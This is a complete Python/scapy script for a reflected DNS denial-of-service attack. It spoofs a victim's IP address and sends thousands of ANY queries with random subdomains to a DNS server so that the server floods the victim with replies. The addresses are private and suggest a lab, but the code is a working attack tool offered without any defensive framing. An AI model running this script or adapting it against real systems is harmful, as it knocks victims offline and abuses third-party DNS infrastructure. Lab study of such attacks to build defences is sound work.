#!/usr/bin/env python3
import random
import string
from scapy.all import IP, UDP, DNS, DNSQR, RandShort, send

VICTIM_IP   = "10.1.0.3"
DNS_SERVER  = "10.12.0.20"
DNS_PORT    = 5353
QUERY_COUNT = 5000
INTERVAL    = 0.001

# to bypass caching
def random_subdomain() -> str:
    length = random.randint(10, 60)
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def dns_reflected_ddos() -> None:
    print(f"- Sending {QUERY_COUNT} spoofed DNS queries...")
    for i in range(QUERY_COUNT):
        qname = f"{random_subdomain()}.example.com"
        packet = (
            IP(src=VICTIM_IP, dst=DNS_SERVER) /
            UDP(sport=RandShort(), dport=DNS_PORT) /
            DNS(rd=1, qd=DNSQR(qname=qname, qtype=255))  # 255 = ANY
        )
        send(packet, count=1, inter=0, verbose=False)
        if (i + 1) % 500 == 0:
            print(f"    {i + 1}/{QUERY_COUNT} sent...")

    print(f"- Done. {QUERY_COUNT} spoofed packets sent.")

if __name__ == "__main__":
    dns_reflected_ddos()